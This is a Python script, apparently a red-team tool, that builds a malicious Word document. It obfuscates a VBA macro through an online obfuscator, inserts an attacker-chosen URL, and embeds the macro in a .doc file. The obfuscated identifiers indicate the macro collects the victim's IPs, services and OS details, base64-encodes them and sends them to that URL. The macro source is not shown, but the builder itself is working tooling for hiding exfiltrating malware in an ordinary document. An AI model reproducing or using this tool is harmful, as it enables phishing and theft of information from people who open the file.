# %%
import aspose.words as aw
import re
import docx
import requests
from docx.enum.section import WD_ORIENTATION
from bs4 import BeautifulSoup


# %%
def showBanner():
    banner = """
    ==================================================
    ::::::::::::::::: Do what's right ::::::::::::::::
     _     ____        __  __       _ ____             
    | |__ | __ ) _   _|  \/  | __ _| |  _ \  ___   ___ 
    | '_ \|  _ \| | | | |\/| |/ _` | | | | |/ _ \ | __|
    | |_) | |_) | |_| | |  | | (_| | | |_| | (_) | (__ 
    |_.__/|____/ \__, |_|  |_|\__,_|_|____/ \___/ \___|
                |___/                                 
    ==================================================
                by TrustedStranger | 2023
    ==================================================
    """
    print(banner)

# %%
def obfuscate(filePath):
     list = 'systemInfo base64SystemInfo url ObtenerIPs objWMIService colItems ipInfo objItem objWMIService colItems ObtenerListaDeServicios GetOSInfo EncodeBase64 arrData objNode objXML SendRequest numerosUsados nuevoNumero asteriscos ReemplazarAsteriscosPorNumeros'
     with open(filePath, 'r') as vbFile:
          vbContent = vbFile.read()     

     response = requests.post("https://www.excel-pratique.com/en/vba_tricks/vba-obfuscator",data={'code':(vbContent),
          'liste': (list), 'submit':'Obfuscate+this+VBA+code'})
     
     soup = BeautifulSoup(response.text, 'html.parser')     
     codeObf= soup.find('textarea', {'class': 'obfuscation_code'})        
     return (codeObf.text)

# %%
def createMacro(docName, url):
    doc = aw.Document(docName)
    project = aw.vba.VbaProject()
    project.name = "AsposeProject"
    doc.vba_project = project

    module = aw.vba.VbaModule()
    module.name = "AsposeModule"
    module.type = aw.vba.VbaModuleType.PROCEDURAL_MODULE
    filePath ='redteam.vb'     
    codeObf= (obfuscate(filePath).replace('&YOURSUPERURLHERE&', url))   
    module.source_code = codeObf
    print(f"\n [+] THIS IS YOUR vba OBFUSCATED CODE:\n\n{codeObf}\n\n")  
    doc.vba_project.modules.add(module)    
    doc.save(f"{docName}")
    print(f'[+] Your macro was loaded to: {docName}\n')

# %%
def createDoc(docName,url):
    doc = docx.Document()
    section = doc.sections[0]
    section.orientation = WD_ORIENTATION.LANDSCAPE
    doc.save(f"{docName}")
    print(f'[+] Your file was created on: {docName}\n')
    createMacro(f"{docName}", url)             

# %%
if __name__ == "__main__":
    showBanner()
    while True:
        docName = input("\n-> Enter the name of the .doc file (for example: test.doc): ")
        
        if not re.match(r'.+\.doc$', docName):
            print("\n[!] The file name must have a .doc extension.")
            continue

        break

    while True:
        url = input("\n-> Enter the URL (for example: http://127.0.0.1/): ")

        if not re.match(r'http(s)?://\S+', url):
            print("\n[!]The entered URL does not have a valid format.")
            continue

        break

    createDoc(docName, url)